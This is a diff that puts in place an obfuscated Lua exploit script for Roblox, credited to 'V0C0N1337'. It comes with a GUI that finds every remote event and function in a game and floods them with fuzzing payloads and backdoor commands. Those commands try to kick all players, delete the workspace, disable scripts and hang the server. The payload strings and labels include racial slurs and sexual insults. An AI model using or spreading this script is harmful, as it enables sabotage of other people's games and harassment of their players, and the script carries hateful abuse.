@@ -1,1 +1,153 @@
-just test wait skid
+--[[ Obfustaced by V0C0N1337 pro fe biypasser ]]--
+local __=function(s)local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';local e,h={},0;for i=1,#b do e[b:sub(i,i)]=i-1 end;local t=0;local r=0;local d='';for i=1,#s do if s:sub(i,i)~='='then t=t*64+e[s:sub(i,i)]r=r+6;if r>=8 then r=r-8;d=d..string.char(math.floor(t/(2^r)))t=t%(2^r)end end end;return d end
+local O_={'U2NyZWVuR3Vp','RnJhbWU=','VGV4dExhYmVs','VGV4dEJ1dHRvbg==','VGV4dEJ1dHRvbg==','VGV4dEJ1dHRvbg==','VGV4dEJ1dG9u','VGV4dEJ1dHRvbg==','VGV4dEJ1dHRvbg==','VGV4dEJ1dHRvbg==','VGV4dEJ1dHRvbg==','VGV4dExhYmVs','Q29yZUd1aQ==','UmVw','UGxheWVycyA=','UmVtb3RlRXZlbnQ=','UmVtb3RlRnVuY3Rpb24=','V29ya3NwYWNl','VXNlcklucHV0VHlwZQ==','VG91Y2g=','TW91c2VCdXR0b24x','TW91c2VCdXR0b24x','Rm9udA==','Q29kZQ==','U291cmNlU2Fuc1NlbWlib2xk','VGV4dFNpemU=','VGV4dFdpZGdldA==','Q29sb3Iz','UmVtb3RlRXZlbnQ=','UmVtb3RlRnVuY3Rpb24=','Q29yZUd1aQ==','U2NyZWVuR3Vp','Q29yZUd1aQ==','Q29yZUd1aQ==','Q29yZUd1aQ==','Q29yZUd1aQ==','Q29yZUd1aQ==','Q29yZUd1aQ==','Q29yZUd1aQ=='}
+local G=game['GetService']
+local S=G(game,__('UmVwbGljYXRlZFN0b3JhZ2U='))
+local P=G(game,__('UGxheWVycyA='):gsub("%s",""))
+local CG=G(game,__('Q29yZUd1aQ=='))
+local LP=P.LocalPlayer
+local attacking,threads=false,{}
+local function R(l)local s='';for i=1,l do s=s..string.char(math.random(33,126))end;return s end
+local function D()local a={};for _,v in ipairs(S:GetDescendants())do if v:IsA(__('UmVtb3RlRXZlbnQ='))or v:IsA(__('UmVtb3RlRnVuY3Rpb24='))then table.insert(a,v)end end;return a end
+local function GArgs(i,remote)local ploads={true,false,nil,0,1,-1,math.huge,-math.huge,math.pi,math.random(),tick(),os.time(),os.clock(),"VOCON1337","1337",string.rep("VOCON",100),string.rep("A",500),string.rep("B",1000),{1,2,3},{a=1,b=2,c=3},{LP},{Enum.Material.Neon,Enum.Material.Fabric},{{},{},{1,2,3}},function() return "1337" end,coroutine.create(function() end),workspace,LP,game,game:GetService("Workspace"),game:GetService("Players"),game:GetService("Lighting"),Enum.Material.Neon,Enum.KeyCode.Space,Enum.Font.SourceSans,Enum.UserInputType.Touch,{nil,true,LP,"VOCON",Enum.Material.Fabric,123,math.huge},{}, ";"..__('cHJpbnQoJ1YwQ08wTjEzM0RPTUlOQVRPUicp'),{1,"a",true,Enum.Material.Slate,Enum.KeyCode.Backspace,math.huge,function() end},9999999,-9999999,1337,420,69,0/0,1/0,-1/0,2^31-1,-2^31,Instance.new("Part"),Instance.new("Model"),Instance.new("Folder"),tostring(math.random()),tostring(os.time()),tostring(LP.UserId),LP.Name}
+    local args={ploads[(i%#ploads)+1]}
+    if i%10==1 then table.insert(args, R(32)) end
+    if i%10==2 then table.insert(args, math.random()) end
+    if i%10==3 then table.insert(args, {math.random(),R(16)}) end
+    if i%10==4 then table.insert(args, true) end
+    if i%10==5 then table.insert(args, nil) end
+    if i%10==6 then table.insert(args, ";script print('niggers')") end
+    if i%10==7 then table.insert(args, {["anal"]="remote got suck my dih"}) end
+    if i%10==8 then table.insert(args, {math.huge, math.pi, R(64)}) end
+    if i%10==9 then table.insert(args, "Ahhh yak0xs1 is fucking slave") end
+    return args
+end
+local function AR(remote)
+    local th=coroutine.create(function()
+        while attacking do
+            for i=1,60 do
+                pcall(function()
+                    if not attacking then return end
+                    if remote:IsA(__('UmVtb3RlRXZlbnQ=')) then
+                        remote:FireServer(unpack(GArgs(i,remote)))
+                        if i%15==0 then
+                            remote:FireServer(";script for _,p in pairs(game.Players:GetPlayers()) do p:Kick('SEX!') end")
+                            remote:FireServer({},"",math.huge,math.pi,R(128))
+                        end
+                    elseif remote:IsA(__('UmVtb3RlRnVuY3Rpb24=')) then
+                        remote:InvokeServer(unpack(GArgs(i,remote)))
+                        if i%15==0 then
+                            remote:InvokeServer(";pcall(function() for _,v in pairs(game:GetDescendants()) do if v:IsA('ModuleScript') then require(v) end end end)")
+                            remote:InvokeServer({1,2,3,4,5,R(32)}, ";require(12345678)", "I hate niggers")
+                        end
+                    end
+                end)
+                if not attacking then return end
+            end
+            wait(0.14)
+        end
+    end)
+    table.insert(threads,th)coroutine.resume(th)
+end
+local function BB(remote,isFunc)
+    local th=coroutine.create(function()
+        local codeList={"print('REMOTE SUCK MY DICK')","for _,p in pairs(game.Players:GetPlayers()) do p:Kick('REMOTE BACKDOOR!') end","for _,v in pairs(workspace:GetChildren()) do v:Destroy() end","Instance.new('Hint',workspace).sex = 'mmm vocon best turkish roblox haxxer '","while true do end","for _,v in pairs(game:GetDescendants()) do if v:IsA('Script') then v.Disabled=true end end"}
+        while attacking do
+            for _,payload in ipairs(codeList)do
+                pcall(function()
+                    if not attacking then return end
+                    if isFunc then
+                        remote:InvokeServer(";script "..payload)
+                    else
+                        remote:FireServer(";script "..payload)
+                    end
+                end)
+                if not attacking then return end
+            end
+            wait(0.13)
+        end
+    end)
+    table.insert(threads,th)coroutine.resume(th)
+end
+local GUI=Instance.new(__('U2NyZWVuR3Vp'))
+GUI.Name="VOCON1337_GUI"
+GUI.ResetOnSpawn=false
+local FR=Instance.new(__('RnJhbWU='),GUI)
+FR.Size=UDim2.new(0,250,0,180)
+FR.Position=UDim2.new(0.5,-125,0.6,-90)
+FR.BackgroundColor3=Color3.new(0.12,0.17,0.20)
+FR.BorderSizePixel=0
+FR.Active=true
+FR.Draggable=true
+local TL=Instance.new(__('VGV4dExhYmVs'),FR)
+TL.Size=UDim2.new(1,0,0,34)
+TL.Text="remote attack v2"
+TL.TextColor3=Color3.fromRGB(0,255,140)
+TL.BackgroundTransparency=1
+TL.Font=Enum.Font.Code
+TL.TextSize=17
+local BT=Instance.new(__('VGV4dEJ1dHRvbg=='),FR)
+BT.Size=UDim2.new(1,-20,0,44)
+BT.Position=UDim2.new(0,10,0,45)
+BT.Text="attck"
+BT.TextColor3=Color3.fromRGB(255,255,255)
+BT.BackgroundColor3=Color3.fromRGB(40,60,90)
+BT.Font=Enum.Font.SourceSansSemibold
+BT.TextSize=18
+BT.AutoButtonColor=true
+local ST=Instance.new(__('VGV4dEJ1dHRvbg=='),FR)
+ST.Size=UDim2.new(0.5,-15,0,36)
+ST.Position=UDim2.new(0,10,0,100)
+ST.Text="STOP ATTACK"
+ST.TextColor3=Color3.fromRGB(255,70,70)
+ST.BackgroundColor3=Color3.fromRGB(60,25,25)
+ST.Font=Enum.Font.SourceSansSemibold
+ST.TextSize=18
+ST.AutoButtonColor=true
+local CL=Instance.new(__('VGV4dEJ1dHRvbg=='),FR)
+CL.Size=UDim2.new(0.5,-15,0,36)
+CL.Position=UDim2.new(0.5,5,0,100)
+CL.Text="CLOSE GUI"
+CL.TextColor3=Color3.fromRGB(255,255,255)
+CL.BackgroundColor3=Color3.fromRGB(40,40,40)
+CL.Font=Enum.Font.SourceSansSemibold
+CL.TextSize=18
+CL.AutoButtonColor=true
+local CR=Instance.new(__('VGV4dExhYmVs'),FR)
+CR.Size=UDim2.new(1,0,0,20)
+CR.Position=UDim2.new(0,0,1,-24)
+CR.Text="CREDITS: V0C0N1337"
+CR.BackgroundTransparency=1
+CR.TextColor3=Color3.fromRGB(255,255,80)
+CR.Font=Enum.Font.Code
+CR.TextSize=14
+GUI.Parent=CG
+BT.MouseButton1Click:Connect(function()
+    if attacking then return end
+    attacking=true
+    BT.Text="attacking"
+    local remotes=D()threads={}
+    if #remotes>0 then
+        for _,rmt in ipairs(remotes)do
+            AR(rmt)BB(rmt,rmt:IsA(__('UmVtb3RlRnVuY3Rpb24=')))
+        end
+    else TL.Text="Remote can't found nigga!"end
+end)
+ST.MouseButton1Click:Connect(function()
+    attacking=false
+    BT.Text="attck"
+    threads={}
+    TL.Text="Attack stopped!"
+end)
+CL.MouseButton1Click:Connect(function()GUI:Destroy()end)
+FR.InputBegan:Connect(function(input)
+    if input.UserInputType==Enum.UserInputType.Touch or input.UserInputType==Enum.UserInputType.MouseButton1 then
+        local st=tick()
+        input.Changed:Connect(function()
+            if input.UserInputState==Enum.UserInputState.End and tick()-st>1.1 then
+                GUI:Destroy()
+            end
+        end)
+    end
+end)
+print(">>> V0C0N1337 HERE")
